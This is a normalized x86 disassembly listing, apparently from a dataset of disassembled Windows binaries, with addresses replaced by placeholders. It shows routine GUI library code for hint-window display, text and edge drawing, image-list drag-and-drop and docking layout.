mov eax [ eax ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x8 ]
call sub_4764dc
push 0x10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_479ce0
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x27c ]
cmp eax 0xfa
jbe r-xdata
mov eax ebx
call sub_49d0c4
mov [ esi + 0x4 ] eax
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push 0x4
mov eax [ ebp - 0x8 ]
call sub_479ce0
push eax
call ShowWindow
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c18a
call GetTickCount
mov edx [ ebp - 0x8 ]
mov [ edx + 0x27c ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x278 ] 0x0
retn
cmp [ rw-data ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoW
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x64
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoW
cmp [ ebp - 0xc ] 0x0
je r-xdata
test al al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_47f8c4
mov eax [ ebp - 0x28 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x8 ]
call sub_479ce0
push eax
call [ rw-data ]
sub_47c1b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47c1d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_40ab90
mov eax [ esi + 0x270 ]
call sub_44df24
mov edi eax
mov eax esi
call sub_473bf8
or eax 0xc10
mov esi eax
push esi
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push edi
call DrawTextW
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_47c238
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_40ab90
call sub_485c78
call sub_485d84
test al al
jne r-xdata
call sub_485c78
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_486dfc
push esp
push 0x1
push 0xf
call sub_485c78
lea ecx [ esp + 0x1c ]
mov edx esi
call sub_485e80
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_47c2a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_477644
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf0 ]
pop esi
pop ebx
retn
sub_47c2c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47c320
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_488c08
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x88 ] esi
mov [ ebx + 0x80 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_488dd8
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x7a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_47c394
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48a188
mov eax ebx
call sub_488c08
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x7a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_47c3c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_488c08
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x7a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_47c440
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x84 ]
push eax
mov ecx [ esi + 0x80 ]
mov edx [ esi + 0x88 ]
mov eax esi
call sub_47c320
mov eax [ rw-data ]
mov eax [ eax ]
movzx eax [ eax + 0x48 ]
mov [ esi + 0x8c ] ax
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x78 ]
call sub_49daf0
sub_47c440
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_488c08
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x7c ]
je r-xdata
mov eax edi
call sub_47c4a4
mov ebx esi
mov [ edi + 0x7c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47c2c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x7c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_47c4a4
push ebx
mov ebx eax
mov eax ebx
call sub_488c08
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x7c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x7c ] eax
sub_47c4c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_488c08
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x7c ]
call sub_47c2c8
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_47c53c
push ebx
push esi
mov esi eax
mov eax esi
call sub_488c08
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x7a ] 0x0
je r-xdata
mov eax esi
call sub_47c4a4
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x7a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_47c370
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ esi + 0x8c ]
call sub_49daf0
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_47c590
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_474178
mov dl 0x1
mov eax [ r-xdata ]
call sub_44d060
mov esi eax
mov [ ebx + 0x270 ] esi
mov eax esi
mov edx ebx
call sub_46f4f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_47c5ec
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x270 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47434c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_47c63c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_44cf34
xor eax eax
push ebp
push sub_47c6da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx ebx
call sub_44dfac
xor eax eax
push ebp
push sub_47c6b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_46f510
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c6be
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
xor edx edx
call sub_44dfac
retn
sub_47c6ec
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_47c7a0
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_47c708
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_47c72c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_47c77c
push ebx
push esi
xor esi esi
call sub_47cdc4
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_47cd9c
mov ebx eax
inc esi
test ebx ebx
jne r-xdata
sub_47c7a0
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_47cdc4
mov esi eax
test esi esi
je r-xdata
movzx ebx [ edx + 0x59 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_47c7a0
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_47c7d8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_47c868
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov edx 0x2
call sub_47c868
jmp r-xdata
retn
sub_47c820
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_47c8ec
retn
movzx ecx [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
mov edx 0x2
call sub_47c8ec
jmp r-xdata
retn
sub_47c868
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov edi edx
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp ebx [ eax + 0x64 ]
jne r-xdata
mov eax edi
mov ebp [ ebx + 0x14 ]
cmp al [ ebp + 0x10 ]
jne r-xdata
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
lea edx [ esp + 0x4 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov eax edi
dec al
je r-xdata
mov ebx ebp
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
mov [ esp ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebx + 0x18 ]
call sub_47ccc4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
sub_47c8ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov ebp [ esp + 0x8 ]
sub ebp [ esp ]
jmp r-xdata
mov ebp [ esp + 0xc ]
sub ebp [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebp
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_47c77c
dec eax
jne r-xdata
mov eax edi
mov edx [ esi + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi [ esi + 0x14 ]
mov eax esi
call sub_47ccc4
mov ebp eax
mov eax esi
call sub_47c7d8
sub ebp eax
jmp r-xdata
mov eax edx
call sub_47ccc4
mov ebp eax
mov ebp [ eax + 0x68 ]
jmp r-xdata
sub_47c9a4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_47c77c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_47cdc4
mov ebx eax
movzx eax [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_47c8ec
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_47c77c
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_47c8ec
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_47c7d8
mov edx eax
add edx esi
mov eax ebx
call sub_47ccec
mov edx edi
mov eax ebx
call sub_47ccec
jmp r-xdata
mov eax ebx
call sub_47cb48
mov eax ebx
call sub_47cd9c
mov ebx eax
test ebx ebx
jne r-xdata
sub_47ca4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
xor edx edx
call sub_4070a8
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4070a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
sub_47ca94
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb7
call sub_40587c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] edi
xor eax eax
push ebp
push sub_47cb05
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_471d54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_47cb18
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_47cd9c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_47cb48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
movzx edx [ edx + 0x10 ]
mov [ eax + 0x8c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_47c8ec
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_47c8ec
mov esi eax
push ebp
call sub_47cb18
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47cd9c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_47c868
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_47c868
mov ecx ebx
pop edx
call sub_40ac8c
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_470710
mov eax [ ebp - 0x4 ]
call sub_47ccc4
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_47ccc4
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_47ccc4
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_47ccc4
push ebx
mov ebx eax
mov eax ebx
call sub_47c7a0
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_47c708
test al al
je r-xdata
mov eax ebx
call sub_47c7d8
pop ebx
retn
sub_47cd00
push ebx
push esi
push edi
mov edi edx
mov edx eax
mov [ edx + 0x20 ] edi
mov ebx [ eax + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47c768
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_47ccf0
mov esi eax
mov edx edi
mov eax esi
call sub_47cd00
sub_47cd3c
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47ccc4
mov edi eax
mov eax ebx
call sub_47c7d8
cmp edi eax
jl r-xdata
mov eax esi
call sub_47c9a4
mov edi [ esi + 0x1c ]
push edi
push sub_47ec54
mov edx esi
mov eax edi
call sub_47d080
mov eax ebx
call sub_47ccc4
mov edi eax
mov eax esi
call sub_47c820
cmp edi eax
jle r-xdata
mov eax ebx
call sub_47cd3c
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_47cda8
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_47c7a0
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_47cdd0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4055c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x80000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
movzx eax [ eax + 0x5d ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_405b0c
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_47c72c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cb58
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_453b68
mov edx eax
mov eax ebx
call sub_44ccf0
mov eax [ ebp - 0x4 ]
call sub_47cfa8
xor eax eax
push ebp
push sub_47cedd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_475884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_47c9a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cee4
mov eax [ ebp - 0x4 ]
call sub_47cfac
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_475848
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_47cee4
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_47ec64
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_47cf38
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
cmp [ esi + 0x32 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_47e244
mov eax [ esi + 0x10 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_47cfc0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_47cfc0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_47cfc0
pop ecx
sub_47d018
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_47cfc0
pop ecx
sub_47d044
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_47d044
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_47d044
pop ecx
sub_47d098
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_47d018
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_47c8ec
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_47c8ec
push eax
mov edx 0x1
mov eax ebx
call sub_47c868
push eax
mov edx 0x2
mov eax ebx
call sub_47c868
pop edx
pop ecx
call sub_40ac8c
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47d120
push ebp
